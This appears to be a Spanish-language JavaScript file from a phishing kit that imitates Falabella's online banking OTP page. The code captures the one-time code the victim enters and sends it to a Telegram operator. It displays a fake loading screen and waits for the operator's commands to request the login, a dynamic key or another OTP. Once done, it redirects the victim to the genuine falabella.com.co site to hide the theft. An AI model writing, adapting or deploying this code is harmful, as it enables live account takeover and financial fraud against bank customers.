/**
 * FALABELLA - otp.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Falabella OTP: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('codigoOTP');
    const btnIngresar = document.getElementById('btnIngresar');
    const overlay = document.getElementById('loadingScreen');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 8);
        const isValid = input.value.length >= 4 && input.value.length <= 8;
        btnIngresar.disabled = !isValid;
        if (isValid) {
            btnIngresar.classList.add('enabled');
        } else {
            btnIngresar.classList.remove('enabled');
        }
    });

    btnIngresar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnIngresar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const data = BancoUtils.saveBankData('falabella', { otp: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('FALABELLA - OTP', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Falabella OTP:', data);
        
        if (overlay) {
            overlay.style.display = 'none';
            console.log('✅ Overlay ocultado');
        }
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_dynamic':
                console.log('🔢 Redirigiendo a dinamica.html');
                window.location.href = 'dinamica.html';
                break;
            case 'request_otp':
                console.log('📱 Limpiando campo de OTP');
                input.value = '';
                btnIngresar.disabled = true;
                btnIngresar.classList.remove('enabled');
                input.focus();
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a falabella.com.co');
                window.location.href = 'https://www.falabella.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
